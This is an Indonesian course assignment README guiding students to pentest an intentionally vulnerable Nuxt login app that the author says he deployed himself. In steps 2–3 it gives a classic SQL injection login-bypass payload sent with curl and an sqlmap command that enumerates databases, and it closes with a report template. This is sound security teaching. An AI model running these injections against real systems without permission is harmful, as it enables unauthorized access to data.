# 🔐 Tugas Eksplorasi Keamanan Aplikasi Hackable Nuxt

## 📌 Deskripsi
Tugas ini bertujuan untuk mengeksplorasi keamanan aplikasi web berbasis Nuxt dengan pendekatan pentesting menggunakan tools dasar seperti `Nmap`, `curl`, `SQLMap`, dan analisis kode sumber. Pengujian dilakukan pada aplikasi milik sendiri yang telah dideploy di Vercel dan memiliki repository terbuka di GitHub.

- 🌐 Target URL: [https://hackable-pentest.vercel.app](https://hackable-pentest.vercel.app)
- 📆 Repository: [Hackable-Pentest GitHub](https://github.com/Muhammad-Ikhwan-Fathulloh/Hackable-Pentest)

---

## 🧪 Langkah Pengujian

### 1. 🔍 Port Scanning menggunakan Nmap
```bash
nmap -p 3000,3306 hackable-pentest.vercel.app
```
**Tujuan**: Mengetahui port yang terbuka untuk mendeteksi layanan berisiko seperti database.

---

### 2. 🧨 SQL Injection Manual via cURL
```bash
curl -X POST https://hackable-pentest.vercel.app/api/login \
-d "username=admin' -- -&password=test"
```
**Tujuan**: Menguji endpoint login apakah rentan terhadap SQL Injection klasik.

---

### 3. 🤖 SQLMap untuk SQL Injection Otomatis
```bash
sqlmap -u "https://hackable-pentest.vercel.app/api/login" \
--data="username=admin&password=test" --dbs --batch
```
**Tujuan**: Mengekstrak nama database dan struktur data secara otomatis.

---

### 4. 🧠 Analisis Source Code Backend
```bash
git clone https://github.com/Muhammad-Ikhwan-Fathulloh/Hackable-Pentest
cd Hackable-Pentest
```
- Periksa file API `/api/login.js`
- Cek query SQL langsung (`raw`) yang rentan terhadap injection
- Validasi input user

---

## 📄 Format Laporan 

- Link Docs: https://docs.google.com/document/d/1IdDiTnkZXfCdaSkzwwehaL7J7tmqYKuIYuK7xl6wIBg/edit?usp=sharing

**Judul:** Laporan Uji Keamanan Aplikasi Hackable Nuxt  
**Nama:** [Nama Mahasiswa]  
**NIM:** [Nomor Induk Mahasiswa]  
**Kelas:** [Nama Kelas / Prodi]

| No | Uji                              | Tools         | Hasil Singkat                                                  | Screenshot          |
|----|----------------------------------|---------------|----------------------------------------------------------------|---------------------|
| 1  | Port Scanning                    | Nmap          | [hasil: port tertutup/terbuka]                                 | [lampiran img]      |
| 2  | Manual SQL Injection             | curl          | [hasil: login berhasil/gagal, error code, respon JSON]         | [lampiran img]      |
| 3  | SQL Injection Automation         | SQLMap        | [hasil: DB ditemukan / tidak]                                  | [lampiran img]      |
| 4  | Review Kode Login                | Source Code   | [query raw SQL ditemukan, sanitasi input?]                     | [lampiran potongan] |

---

## ✅ Kesimpulan
Tuliskan temuan utama dan saran perbaikan:
- Potensi celah SQL Injection ditemukan/tidak
- Pentingnya validasi dan parameterized query
- Saran perbaikan untuk keamanan endpoint login

---

## ⚠️ Disclaimer
> Seluruh pengujian dilakukan hanya pada aplikasi **yang dimiliki dan dikuasai sendiri**. Melakukan pengujian pada sistem publik tanpa izin merupakan tindakan ilegal dan tidak etis.

---

## 📌 Lisensi
MIT License - For Educational and Ethical Hacking Purposes Only.
